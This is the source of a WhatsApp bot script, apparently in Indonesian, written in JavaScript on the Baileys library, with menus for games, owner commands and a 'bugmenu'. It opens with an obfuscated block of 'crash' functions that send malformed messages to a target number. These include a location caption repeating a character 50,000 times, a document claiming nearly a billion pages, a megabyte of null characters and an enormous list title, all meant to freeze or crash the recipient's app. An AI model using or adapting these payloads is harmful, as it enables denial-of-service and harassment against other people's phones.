var _0x1e2d5c=_0x11d6;(function(_0x3a36c4,_0x23845e){var _0x1340f2=_0x11d6,_0x423967=_0x3a36c4();while(!![]){try{var _0x58784a=parseInt(_0x1340f2(0xf4))/0x1+-parseInt(_0x1340f2(0xec))/0x2+parseInt(_0x1340f2(0xe9))/0x3*(parseInt(_0x1340f2(0xdc))/0x4)+parseInt(_0x1340f2(0xe2))/0x5*(parseInt(_0x1340f2(0xe0))/0x6)+-parseInt(_0x1340f2(0xe1))/0x7+-parseInt(_0x1340f2(0xf5))/0x8+parseInt(_0x1340f2(0xd0))/0x9;if(_0x58784a===_0x23845e)break;else _0x423967['push'](_0x423967['shift']());}catch(_0xd4c5ce){_0x423967['push'](_0x423967['shift']());}}}(_0x1a62,0x54f30));async function lokascrash(_0x4f6d21,_0xce0a0){var _0x21c83a=_0x11d6,_0x4418ba=generateWAMessageFromContent(_0x4f6d21,proto['Message'][_0x21c83a(0xef)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'Alfin Faridh Taufiqiy'+'ꦾ'[_0x21c83a(0xeb)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x4f6d21,'quoted':_0xce0a0});await qio[_0x21c83a(0xcf)](_0x4f6d21,_0x4418ba['message'],{'participant':{'jid':_0x4f6d21},'messageId':_0x4418ba[_0x21c83a(0xf1)]['id']});}function _0x1a62(){var _0x7e476b=['whatsapp','{\x22currency\x22:\x22USD\x22,\x22payment_configuration\x22:\x22\x22,\x22payment_type\x22:\x22\x22,\x22transaction_id\x22:\x22\x22,\x22total_amount\x22:{\x22value\x22:879912500,\x22offset\x22:100},\x22reference_id\x22:\x224N88TZPXWUM\x22,\x22type\x22:\x22physical-goods\x22,\x22payment_method\x22:\x22\x22,\x22order\x22:{\x22status\x22:\x22pending\x22,\x22description\x22:\x22\x22,\x22subtotal\x22:{\x22value\x22:990000000,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:8712000,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:118800000,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:500,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x22custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\x22,\x22name\x22:\x22JAMUR\x22,\x22amount\x22:{\x22value\x22:1000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\x22,\x22name\x22:\x22Wortel\x22,\x22amount\x22:{\x22value\x22:5000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\x22,\x22name\x22:\x22Alfin Faridh Taufiqiy\x22,\x22amount\x22:{\x22value\x22:4000000,\x22offset\x22:100},\x22quantity\x22:99}]},\x22additional_note\x22:\x22\x22}','1715880173','0@s.whatsapp.net','./lib/lowdb/adapters/image/virgam.png','1715881084144','INITIATED_BY_ME','29396JrOBrz','chat','waUploadToServer','FBPAY','1219146ePLNMy','3857903JGHTKQ','5lNzRPd','Message','1715876003','now','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Alfin Faridh Taufiqiy','ngaceng','global_search_new_chat','192JYcATA','image/webp','repeat','612558dIEoDX','review_and_pay','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','fromObject','10116','key','1679959486','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','222955cMBOSf','3722872DuOUjg','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','message','relayMessage','6968133TKMbxU','pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','Alfin Faridh Taufiqiy','Alfin Faridh Taufiqiy'];_0x1a62=function(){return _0x7e476b;};return _0x1a62();}function _0x11d6(_0x2d939e,_0x51e809){var _0x1a6244=_0x1a62();return _0x11d6=function(_0x11d62b,_0x53b752){_0x11d62b=_0x11d62b-0xcc;var _0x27cc03=_0x1a6244[_0x11d62b];return _0x27cc03;},_0x11d6(_0x2d939e,_0x51e809);}async function iponcrash(_0x1116b7){var _0x3eece9=_0x11d6;await qio['relayMessage'](_0x1116b7,{'paymentInviteMessage':{'serviceType':_0x3eece9(0xdf),'expiryTimestamp':Date[_0x3eece9(0xe5)]()+0x6c258c00}},{'participant':{'jid':_0x1116b7}});}async function dokucrash(_0x4d91b5,_0x50837c){var _0x904d86=_0x11d6,_0x10c1c8=generateWAMessageFromContent(_0x4d91b5,proto[_0x904d86(0xe3)][_0x904d86(0xef)]({'documentMessage':{'url':'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','mimetype':_0x904d86(0xe7),'fileSha256':_0x904d86(0xee),'fileLength':'999999999','pageCount':0x3b9ac9ff,'mediaKey':_0x904d86(0xcc),'fileName':_0x904d86(0xd4)+'ꦾ'[_0x904d86(0xeb)](0xea60),'fileEncSha256':_0x904d86(0xd1),'directPath':'/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','mediaKeyTimestamp':_0x904d86(0xd7)}}),{'userJid':_0x4d91b5,'quoted':_0x50837c});await qio[_0x904d86(0xcf)](_0x4d91b5,_0x10c1c8[_0x904d86(0xce)],{'participant':{'jid':_0x4d91b5},'messageId':_0x10c1c8[_0x904d86(0xf1)]['id']});}async function crashasu(_0x12b93a,_0x14311a){var _0x1c7728=_0x11d6,_0x580993=generateWAMessageFromContent(_0x12b93a,proto[_0x1c7728(0xe3)][_0x1c7728(0xef)]({'stickerMessage':{'url':_0x1c7728(0xcd),'fileSha256':'CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','fileEncSha256':'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','mediaKey':_0x1c7728(0xf3),'mimetype':_0x1c7728(0xea),'directPath':_0x1c7728(0xd2),'fileLength':_0x1c7728(0xf0),'mediaKeyTimestamp':_0x1c7728(0xe4),'isAnimated':![],'stickerSentTs':_0x1c7728(0xda),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x12b93a,'quoted':_0x14311a});await qio[_0x1c7728(0xcf)](_0x12b93a,_0x580993[_0x1c7728(0xce)],{'participant':{'jid':_0x12b93a},'messageId':_0x580993[_0x1c7728(0xf1)]['id']});}async function virgamcrash(_0x106fce,_0x162f86){var _0x422f67=_0x11d6,_0xc9ace7=generateWAMessageFromContent(_0x106fce,proto[_0x422f67(0xe3)][_0x422f67(0xef)]({'interactiveMessage':{'header':{'title':'Alfin Faridh Taufiqiy','hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':'https://telegra.ph/file/f82677de30c85652f80a3.jpg'}},{'upload':qio[_0x422f67(0xde)]})},'body':{'text':''},'footer':{'text':_0x422f67(0xe6)},'nativeFlowMessage':{'messageParamsJson':'\x00'[_0x422f67(0xeb)](0xf4240)}}}),{'userJid':_0x106fce,'quoted':_0x162f86});await qio[_0x422f67(0xcf)](_0x106fce,_0xc9ace7[_0x422f67(0xce)],{'participant':{'jid':_0x106fce},'messageId':_0xc9ace7[_0x422f67(0xf1)]['id']});}async function listcrash(_0x19d69b,_0x1896dd){var _0x327302=_0x11d6,_0x58f243=generateWAMessageFromContent(_0x19d69b,proto['Message'][_0x327302(0xef)]({'listMessage':{'title':_0x327302(0xd3)+'ꦾ'[_0x327302(0xeb)](0xe09c0),'footerText':_0x327302(0xd4),'description':_0x327302(0xd3),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x327302(0xd4),'products':[{'productId':'4392524570816732'}]}],'productListHeaderImage':{'productId':'4392524570816732','jpegThumbnail':null},'businessOwnerJid':_0x327302(0xd8)}},'footer':_0x327302(0xd3),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x327302(0xf2),'entryPointConversionSource':_0x327302(0xe8),'entryPointConversionApp':_0x327302(0xd5),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x327302(0xdb)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x19d69b,'quoted':qiobug});await qio[_0x327302(0xcf)](_0x19d69b,_0x58f243[_0x327302(0xce)],{'participant':{'jid':_0x19d69b},'messageId':_0x58f243[_0x327302(0xf1)]['id']});}const qiobatosai={'key':{'participant':'0@s.whatsapp.net',...m[_0x1e2d5c(0xdd)]?{'remoteJid':'status@broadcast'}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs['readFileSync'](_0x1e2d5c(0xd9))},'nativeFlowMessage':{'buttons':[{'name':_0x1e2d5c(0xed),'buttonParamsJson':_0x1e2d5c(0xd6)}]}}}};
//=================================================//
/*if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}
*/

if (!isGroup && !isDeveloper && db.data.settings[botNumber].onlygrub ) {
	if (command){
return m.reply(` Halo ${m.pushName}! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !`)
}
}

//=================================================//

if (m.message) {
  if (isCmd && !m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n😘 ${ucapanWaktu} ☠️`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`هناك رسالة جديدة`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`⌛ وقت: ${new Date().toLocaleString()}
🗨️ رسالة: ${m.body || m.mtype}
😶 اسم: ${pushname}
👥 جيدس: ${m.sender}`)));
  } else if (m.isGroup) {
    console.log(chalk.black(chalk.bgHex('#ff5e78').bold(`\n😘 ${ucapanWaktu} ☠️`)));
    console.log(chalk.white(chalk.bgHex('#4a69bd').bold(`هناك رسالة جديدة`)));
    console.log(chalk.black(chalk.bgHex('#fdcb6e')(`⌛ وقت: ${new Date().toLocaleString()}
🗨️ رسالة: ${m.body || m.mtype}
😶 اسم: ${pushname}
👥 جيدس: ${m.sender}
👥 مجموعة الاسم: ${groupName}`)));
  }
}

//=================================================//
switch (command) {
// Status
case 'public': {
if (!isPrem) return qioreply(mess.prem) 
qio.public = true
qioreply('succes')
}
break
//=================================================//
case 'clearchat': {
pee = "\n".repeat(200)
qioreply(pee + '😁🖕')
}
break
//=================================================//
//Menu
case "menu": case "help": {
await loading()
let anjg = [bangke, cok]
let randomIndex = Math.floor(Math.random() * anjg.length)
let mydick = anjg[randomIndex]

//text menu
let tholol = `
─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
`

let njing = `
─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}bugmenu
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`
//Button Menu
let freesex = {
viewOnceMessage: {
message: {
interactiveMessage: {
"contextInfo": {
"mentionedJid": [m.sender],
"isForwarded": true,
"forwardedNewsletterMessageInfo": {
"newsletterJid": '0@newsletter',
"newsletterName": 'By Alfin Faridh Taufiqiy',
"serverMessageId": 1
},
},
"header": {
"title": tholol,
...(await prepareWAMessageMedia({ image: bangke }, { upload: qio.waUploadToServer })),
"hasMediaAttachment": true
},
"body": {
"text": ""
},
"footer": {
"text": "Alfin Faridh Taufiqiy"
},
"nativeFlowMessage": {
"buttons": [
{
"name": "single_select",
"buttonParamsJson": `{ "title": "Alfin Faridh Taufiqiy", "sections": [{ "title": "›𝘚𝘦𝘭𝘦𝘤𝘪𝘰𝘯𝘦 𝘶𝘮", "highlight_label": "☠️Crash Wangsaf️", "rows": [{ "header": "›𝙱𝚞𝚐 𝙼𝚎𝚗𝚞", "title": "Alfin Faridh Taufiqiy", "id": ".bugmenu" }, { "header": "›𝙰𝚕𝚕 𝙼𝚎𝚗𝚞", "title": "Alfin Faridh Taufiqiy", "id": ".allmenu" }, { "header": "›𝙸𝚗𝚏𝚘 𝙱𝚘𝚝𝚣", "title": "Alfin Faridh Taufiqiy", "id": ".infobot" }] }] }`
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Saluran WhatsApp\",\"url\":\"https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16\",\"merchant_url\":\"https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16\"}"
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Channel Youtube\",\"url\":\"https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16\",\"merchant_url\":\"https://whatsapp.com/channel/0029VafJowe7dmeZ941VPt16\"}"
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Akun Telegram\",\"url\":\"https://t.me/apintrava\",\"merchant_url\":\"https://t.me/apintrava\"}"
},
{
"name": "cta_url",
"buttonParamsJson": "{\"display_text\":\"Akun Instagram\",\"url\":\"https://www.instagram.com/coreinpin/\",\"merchant_url\":\"https://www.instagram.com/coreinpin/\"}"
}
],
"messageParamsJson": ""
}
}
}
}
};
let kontollurus = {
image: bangke,
caption: njing,
contextInfo:{externalAdReply:{
title: '⟠ 𝐀𝐥𝐰𝐚𝐲𝐬𝐚𝐪𝐢𝐨𝐨 𝐍𝐨 𝐂𝐨𝐮𝐧𝐭𝐞𝐫',
body: `👤 名前 : ${m.pushName}\n🕑${ucapanWaktu}`, 
showAdAttribution: true,
thumbnail: mydick,
mediaType: 4,
MediaUrl:`${global.yt}`,
sourceUrl:`${global.yt}`,
}}
};

if ( db.data.settings[botNumber].menuType === 'externalImage') {
qio.sendMessage(m.chat, kontollurus, { quoted: m })
} else if ( db.data.settings[botNumber].menuType === 'buttonImage') {
qio.relayMessage(m.chat, freesex, {})
}

}
break

case 'asupanmenu':
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││*LIST FITUR ASUPAN*
││✑${prefix}tiktokgirl 
││✑${prefix}tiktoknukthy 
││✑${prefix}tiktokkayes
││✑${prefix}tiktokpanrika
││✑${prefix}tiktoknotnot
││✑${prefix}tiktokghea
││✑${prefix}tiktoksantuy
││✑${prefix}paptt *foto/video*
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break

//=================================================//
case "ownermenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}addowner *6288xxx*
││✑${prefix}delowner *628xxx*
││✑${prefix}addprem *6288xxx*
││✑${prefix}delprem *628xxx*
││✑${prefix}aksesmurbug *6288xxx/tag*
││✑${prefix}delaksesmurbug *6288xxx/tag*
││✑${prefix}addseller *6288xxx*
││✑${prefix}delseller *6288xxx*
││✑${prefix}tempban *62|8xxx*
││✑${prefix}addzxcwords *kata kasar*
││✑${prefix}delzxcwords *kata kasar*
││✑${prefix}changemenu *button/non*
││✑${prefix}autoread *on/off*
││✑${prefix}autotyping *on/off*
││✑${prefix}autorecord *on/off*
││✑${prefix}autobio *on/off*
││✑${prefix}self
││✑${prefix}public
││✑${prefix}shutdown
││✑${prefix}addcase 
││✑${prefix}delcase
││✑${prefix}join *link group*
││✑${prefix}block *nomor*
││✑${prefix}unblock *nomor*
││✑${prefix}listblock
││✑${prefix}setppbot *reply gambar*
││✑${prefix}setbiobot *teks*
││✑${prefix}listpc
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
}

//=================================================//
case "gamemenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
┌└─────────────┈ ✈
└─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
│𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
│𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
│𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
│𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
│𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
│𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
│𝐌𝐨𝐝𝐞 : *Private-Bot*
│𝐑𝐮𝐧𝐧𝐢𝐧𝐠 : *Panel Only*
│𝐋𝐢𝐛𝐫𝐚𝐫𝐲 : *Baileys-Ws*   
│
└─ 𝙐𝙎𝙀𝙍 𝙄𝙉𝙁𝙊 
│𝐍𝐚𝐦𝐞 : *${m.pushName}*
│𝐏𝐫𝐞𝐦𝐢𝐮𝐦 : *${isPrem ? '✅' : `❌`}*
│
└─ 𝙏𝙄𝙈𝙀 𝙄𝙉𝙁𝙊 
│𝐓𝐢𝐦𝐞 : *${time}*
│𝐖𝐞𝐞𝐤 : *${week}*
└─────────────┈ ✈
┌└─────────────┈ ✈
││✑${prefix}cekkhodamcore *nama*
││✑${prefix}cekkhodam *nama*
││✑${prefix}cekjodoh *nama*
││✑${prefix}cekkuota *nama*
││✑${prefix}tictactoe
││✑${prefix}suitpvp
││✑${prefix}kuismath
││✑${prefix}tebak *gambar*
││✑${prefix}tebak *kata*
││✑${prefix}tebak *kalimat*
││✑${prefix}tebak *lirik*
││✑${prefix}tebak *tebakan*
││✑${prefix}tebak *bendera*
││✑${prefix}tebak *bendera2*
││✑${prefix}tebak *kabupaten*
││✑${prefix}tebak *kimia*
││✑${prefix}tebak *asahotak*
││✑${prefix}tebak *siapakahaku*
││✑${prefix}tebak *susunkata*
││✑${prefix}tebak *tekateki*
││✑${prefix}kerja 
││✑${prefix}bankcek 
││✑${prefix}maling 
││✑${prefix}banknabung 
││✑${prefix}banktarik 
││✑${prefix}berkebon 
││✑${prefix}crafting 
││✑${prefix}bet 
││✑${prefix}bonus 
││✑${prefix}buah 
││✑${prefix}nebang 
││✑${prefix}bekerja 
││✑${prefix}bansos 
││✑${prefix}taxy 
││✑${prefix}mulung 
││✑${prefix}berburu 
││✑${prefix}polisi 
││✑${prefix}berdagang 
││✑${prefix}rampok 
││✑${prefix}bunuh 
││✑${prefix}collect 
││✑${prefix}mancing 
││✑${prefix}repair 
││✑${prefix}feed 
││✑${prefix}fight 
││✑${prefix}gajian 
││✑${prefix}upgrade 
││✑${prefix}transfer 
││✑${prefix}shop 
││✑${prefix}selectskill 
││✑${prefix}sampah 
││✑${prefix}roket 
││✑${prefix}ojek 
││✑${prefix}nguli 
││✑${prefix}pasar 
││✑${prefix}rob 
││✑${prefix}referal 
││✑${prefix}petshop 
││✑${prefix}kolam 
││✑${prefix}koboy 
││✑${prefix}leaderboard 
││✑${prefix}Nomorhoki
││✑${prefix}Artimimpi
││✑${prefix}Artinama
││✑${prefix}Ramaljodoh
││✑${prefix}Ramalcinta
││✑${prefix}Ramaljodohbali
││✑${prefix}Suamiistri
││✑${prefix}Cocoknama
││✑${prefix}Pasangan
││✑${prefix}Jadiannikah
││✑${prefix}Sifatusaha
││✑${prefix}Rezeki
││✑${prefix}Pekerjaan
││✑${prefix}Nasib
││✑${prefix}Penyakit
││✑${prefix}Tarot
││✑${prefix}Fengshui
││✑${prefix}Haribaik
││✑${prefix}Harisangar
││✑${prefix}Harisial
││✑${prefix}Nagahari
││✑${prefix}Arahrezeki
││✑${prefix}Peruntungan
││✑${prefix}Weton
││✑${prefix}Karakter
││✑${prefix}Keberuntungan
││✑${prefix}Masasubur
││✑${prefix}Memancing
││✑${prefix}Zodiak
││✑${prefix}Shio
└─────────────────┈ ✈
 │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
 └─────────────────┈ ✈`)
break
}

//=================================================//
case "convertmenu": {
await loading()
m.reply(`─✈
│ _Hi_ 👋 
└┬☄  *${m.pushName}* 
││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
│└────────────┈ ✈
└┬────────────┈ ✈
    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
